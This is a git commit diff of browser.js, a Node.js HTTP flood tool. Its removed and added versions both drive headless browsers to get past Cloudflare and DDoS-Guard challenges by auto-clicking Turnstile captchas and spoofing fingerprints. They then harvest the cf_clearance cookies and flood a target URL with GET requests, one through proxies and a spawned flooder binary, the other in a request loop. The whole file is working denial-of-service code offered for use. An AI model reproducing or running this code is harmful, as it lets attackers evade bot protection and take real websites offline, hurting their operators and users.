4f8ca890df8199734492f8eaebc3177ea00d2930
Arnaofvalor <120366005+Arnaofvalor@users.noreply.github.com>
2025-04-27 12:19:07 +0700

    Add files via upload

--- browser.js
+++ browser.js
@@ -1,239 +1,137 @@
-const puppeteer = require('puppeteer');
-const { spawn, exec } = require('child_process');
-const fs = require('fs');
-const cluster = require('cluster');
+console.clear()
+const { request } = require('undici');
+const puppeteer = require('puppeteer-extra');
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const os = require('os');
+const args = process.argv.slice(2);
 
-var [target, time, threads, requests, proxyfile, winlin, debug] = process.argv.slice(2);
-const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
-const scriptContent = fs.readFileSync('script.js', 'utf8');
-
-process.on("uncaughtException", function (error) { console.log(error) });
-process.on("unhandledRejection", function (error) { console.log(error) });
-process.setMaxListeners(0);
-
-const getRandomChar = () => {
-    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
-    const randomIndex = Math.floor(Math.random() * pizda4.length);
-    return pizda4[randomIndex];
-};
-
-function log(string) {
-    let d = new Date();
-    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
-    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
-    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
-
-    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
-        hours = "undefined";
-        minutes = "undefined";
-        seconds = "undefined";
-    }
-
-    console.log(`(${hours}:${minutes}:${seconds}) - ${string}`);
+if (args.length < 2) {
+  return //console.log(`FC-Browser V1.0.0 (Bypass Cloudflare Captcha / UAM)
+  //
+//Usage: node FC-Browser.js [url] [time]
+//--proxy proxy.txt if you using proxy file to start FC-Browser`);
 }
 
-let lol = 0;
+const target = args[0];
+const time = parseInt(args[1], 10);
 
-target = target + getRandomChar();
+// Menambahkan plugin stealth
+puppeteer.use(StealthPlugin());
 
-async function main(proxy) {
-    let browser;
-    try {
-        lol = lol + 1;
-        log(`[BROWSER #${lol}] New session started`);
-        const randomVersion = Math.floor(Math.random() * 3) + 119;
-        var dodopizza = '';
-        if (winlin == "Windows") {
-            dodopizza = "Windows NT 10.0; Win64; x64";
-        } else {
-            dodopizza = "X11; Linux x86_64";
-        }
-        const userAgent = `Mozilla/5.0 (${dodopizza}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36`;
-        const port = 1000 + Math.floor(Math.random() * 59000);
-        browser = await puppeteer.launch({
-            headless: false,
-            args: [
-                '--incognito',
-                '--start-maximized',
-                '--disable-blink-features=AutomationControlled',
-                '--disable-features=IsolateOrigins,site-per-process',
-                '--use-fake-device-for-media-stream',
-                '--use-fake-ui-for-media-stream',
-                '--no-sandbox',
-                '--disable-dev-shm-usage',
-                '--disable-software-rasterizer',
-                '--enable-features=NetworkService',
-                '--proxy-server=' + proxy,
-                '--user-agent=' + userAgent,
-                '--auto-open-devtools-for-tabs',
-                `--remote-debugging-port=${port}`,
-                '--num=1',
-                '--disable-threaded-animation',
-                '--no-process-per-site',
-                '--in-process-gpu',
-                '--use-gl=swiftshader',
-                '--disable-gpu',
-            ],
-            ignoreDefaultArgs: ['--enable-automation'],
-            defaultViewport: null,
+async function visitPage(originalUrl) {
+  const browser = await puppeteer.launch({
+    headless: true,
+    args: [
+      '--no-sandbox',
+      '--disable-setuid-sandbox',
+      '--start-maximized',
+      '--disable-infobars',
+      '--disable-web-security',
+      '--disable-blink-features=AutomationControlled'
+    ]
+  });
+
+  const page = await browser.newPage();
+  const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.59';
+  
+  await page.setUserAgent(userAgent);
+  await page.setViewport({ width: 1280, height: 800 });
+
+  console.log(`[!] Navigating to URL: ${originalUrl}`);
+
+  try {
+    await page.goto(originalUrl, { waitUntil: 'networkidle2' });
+
+    const isCFProtect = await page.evaluate(() => {
+      const titleText = document.title.toLowerCase();
+      return titleText.includes("just a moment");
+    });
+
+    if (isCFProtect) {
+      console.log("[-] Detected CF Protection - Initiating bypass");
+      const clickX = 219;
+      const clickY = 279;
+
+      const intervalId = setInterval(async () => {
+        const stillProtected = await page.evaluate(() => {
+          const titleText = document.title.toLowerCase();
+          return titleText.includes("just a moment");
         });
 
-        if (!browser) {
-            error('Browser is not initialized. Call initBrowser() first.');
-            return null;
-        }
-
-        await new Promise(resolve => setTimeout(resolve, 100));
-        const blankPage = await browser.newPage();
-
-        const deviceMemories = [2, 4, 8]
-        const hardwareConcurrency = deviceMemories[~~(Math.random() * deviceMemories.length)]
-        const deviceMemory = deviceMemories[~~(Math.random() * deviceMemories.length)]
-
-        const expression = `(() => {
-            ${scriptContent}; abc(${hardwareConcurrency}, ${deviceMemory}, ${Math.random()})
-          })()`;
-
-        await new Promise(resolve => setTimeout(resolve, 100));
-        await blankPage.evaluate(expression);
-        await blankPage.goto('about:blank');
-        await blankPage.goto(target);
-
-        await blankPage.evaluate((target) => {
-            window.open(target, '_blank');
-        }, target);
-
-        await new Promise(resolve => setTimeout(resolve, 5000));
-
-        const pages = await browser.pages();
-        const newPage = pages[pages.length - 1];
-
-        const seks = await newPage.title();
-        log(`[BROWSER #${lol}] Title: ${seks} | Usergent: ${userAgent}`);
-
-        if (!newPage) {
-            error('New page not found');
-            return null;
-        }
-
-        await new Promise(resolve => setTimeout(resolve, 5000));
-        await turnstile(newPage);
-        await new Promise(resolve => setTimeout(resolve, 5000));
-
-        const checked_title = await newPage.title();
-        if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD", "Interactive Challenge", "Interactive"].includes(checked_title)) {
-            await browser.close();
-        }   
-        
-        const title = await newPage.title();
-        if (["Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD", "Interactive Challenge", "Interactive"].includes(title)) {
-            await browser.close();
+        if (stillProtected) {
+          await page.mouse.click(clickX, clickY);
         } else {
-            log(`[BROWSER #${lol}] Protection not found ~ [Default Site]`);
+          console.log("[+] Cloudflare Successfully Bypassed");
+
+          const cookies = await page.cookies();
+          const cookieHeader = cookies
+  .filter(cookie => cookie.name.startsWith('cf_clearance'))
+  .map(cookie => `${cookie.name}=${cookie.value}`)
+  .join('; ');
+
+          console.log(`[+] Cookies: ${cookieHeader}`);
+          console.log(`[+] User-Agent: ${userAgent}`);
+          clearInterval(intervalId);
+          
+          console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
+          
+          flood(target, userAgent, cookieHeader, time);
         }
-
-        if (["ddos-guard", "DDOS-GUARD", "DDoS-Guard"].includes(title)) {
-            log(`[BROWSER #${lol}] Detected protection ~ DDoS-Guard (JavaScript Challenge)`);
-            requests = 1;
-        }
-
-        const cookie = await newPage.cookies();
-        const cookieString = cookie.map((c) => `${c.name}=${c.value}`).join("; ");
-        log(`[BROWSER #${lol}] TITLE: ${title} COOKIE: ${cookieString}`);
-        gogoebashit(cookieString, userAgent, proxy);
-        await browser.close();
-    } catch(err) {
-        if(debug == true || debug == "true") {
-            console.log(err);
-        }
-    } finally {
-        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-        main(proxy);
-        browser.close();
-    }
-}
-
-async function turnstile(page) {
-    const iframeElement = await page.$('iframe[allow="cross-origin-isolated; fullscreen"]');
-
-    if (!iframeElement) {
-        return;
-    }
-
-    const iframeBox = await iframeElement.boundingBox();
-
-    if (!iframeBox) {
-        return;
-    }
-
-    log(`[BROWSER #${lol}] Detected protection ~ Cloudflare JS (Turnstile Captcha)`);
-
-    const x = iframeBox.x + (iframeBox.width / 2);
-    const y = iframeBox.y + (iframeBox.height / 2);
-
-    log(`[BROWSER #${lol}] Clicked ~ ${x} ${y}`)
-
-    await page.mouse.move(x, y);
-    await new Promise(resolve => setTimeout(resolve, 111));
-    await page.mouse.down();
-    await new Promise(resolve => setTimeout(resolve, 222));
-    await page.mouse.up();
-    await new Promise(resolve => setTimeout(resolve, 100));
-    await page.click(`body`, { x, y });
-}
-
-function gogoebashit(cookieString, userAgent, proxy) {
-    var args;
-    if (debug == true || debug == "true") {
-        args = [
-            "GET",
-            target,
-            "10",
-            requests,
-            "--debug",
-            "--browserp", `${proxy}`,
-            "--browseru", `${userAgent}`,
-            "--cookie", `${cookieString}`,
-        ]
+      }, 5000);
     } else {
-        args = [
-            "GET",
-            target,
-            time,
-            requests,
-            "--browserp", `${proxy}`,
-            "--browseru", `${userAgent}`,
-            "--cookie", `${cookieString}`
-        ]
+    
+      console.log("[+] No CF Protection detected - Proceeding normally");
+      console.log(`[+] Starting Flooding To ${target} For ${time} Seconds`);
+      
+      flood(target, userAgent, "", time);
     }
-    const xyeta = spawn('./flooder', args, {
-        stdio: 'pipe'
-    })
 
-    xyeta.stdout.on('data', (data) => {
-        console.log(`${data}`);
+  } catch (error) {
+  /*
+    console.error('An error occurred:', error);
+    */
+  }
+}
+
+async function flood(url, userAgent, cookieHeader, time) {
+  const endTime = Date.now() + time * 1000;
+  const cpuCount = os.cpus().length; // Number of CPU cores
+
+  async function sendRequest() {
+    try {
+      const headers = {
+        'User-Agent': userAgent,
+        'Cookie': cookieHeader
+      };
+  
+      const { statusCode } = await request(url, {
+        method: 'GET',
+        headers
     });
+      
+      //nsole.log()
+      
+    } catch (error) {
+      
+    }
+  }
 
+  
+  const attackInterval = setInterval(() => {
+    for (let i = 0; i < 60; i++) {
+        sendRequest()
+    }
+    setTimeout(() => {
+      clearInterval(attackInterval);
+      console.log('Attack stopped.');
+      process.exit(0);
+  }, time * 1000 )
+});
+  
+  console.log(`[+] Flood started on ${cpuCount} cores for ${time} seconds`);
 }
 
 
-function start() {
-    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-    main(proxy);
-}
 
-if (cluster.isMaster) {
-    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
 
-    cluster.on('exit', (worker) => {
-        log(`Worker ${worker.process.pid} died. Restarting...`);
-        cluster.fork({ core: worker.id % os.cpus().length });
-    });
-
-    setTimeout(() => process.exit(log('Primary process exiting...')), time * 1000);
-
-} else {
-    start();
-    setTimeout(() => process.exit(log(`Worker ${process.pid} exiting...`)), time * 1000);
-}
+visitPage(target)
